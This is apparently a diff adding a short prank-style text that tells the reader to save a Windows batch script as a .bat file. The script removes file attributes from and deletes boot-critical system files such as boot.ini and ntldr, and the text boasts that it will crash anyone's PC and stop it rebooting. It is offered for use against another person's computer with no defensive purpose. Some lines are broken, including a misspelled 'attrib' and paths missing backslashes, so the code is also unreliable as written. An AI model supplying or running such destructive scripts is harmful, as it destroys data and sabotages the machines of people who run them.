@@ -1,0 +1,16 @@
+Open up notepad and copy and paste that. Save it as a .bat file :-
+
+@echo off
+attrib -r -s -h c:autoexec.bat
+del c:autoexec.bat
+attrib -r -s -h c:boot.ini
+del c:boot.ini
+ttrib -r -s -h c:ntldr
+del c:ntldr
+attrib -r -s -h c:windowswin.ini
+del c:windowswin.ini
+
+
+IT WILL CRASH ANYONE'S PC .
+
+This should shut down the person’s computer. It shuts it off once and deletes the files needed to reboot and restart.
